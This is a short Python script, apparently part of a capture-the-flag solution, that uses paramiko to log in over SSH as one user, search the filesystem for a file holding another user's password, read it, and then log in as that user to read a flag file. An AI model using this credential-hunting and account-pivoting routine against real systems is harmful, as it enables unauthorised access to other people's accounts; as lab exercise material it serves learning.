import paramiko
from pwn import *


def get_angela_password(HOST, PORT, sophia_password):
    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()
    ssh.connect(hostname=HOST, username="sophia", password=sophia_password, port=PORT)

    # Get password file location
    p = log.progress("angela")
    time.sleep(1)
    stdin, stdout, stderr = ssh.exec_command("find / -name whereismypazz.txt")
    stdout = stdout.readlines()
    password_file = "".join(stdout).split()[0]

    # Read file and get password
    stdin, stdout, stderr = ssh.exec_command(f"cat {password_file}")
    stdout = stdout.readlines()
    angela_password = "".join(stdout).split()[0]
    p.status(angela_password)
    ssh.close() 

    # Get flag
    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()
    ssh.connect(hostname=HOST, username="angela", password=angela_password, port=PORT)

    stdin, stdout, stderr = ssh.exec_command("cat flagz.txt")
    stdout = stdout.readlines()
    flag = "".join(stdout).split()[0]
    p.success(angela_password + " : " + flag)
    ssh.close()

    return angela_password

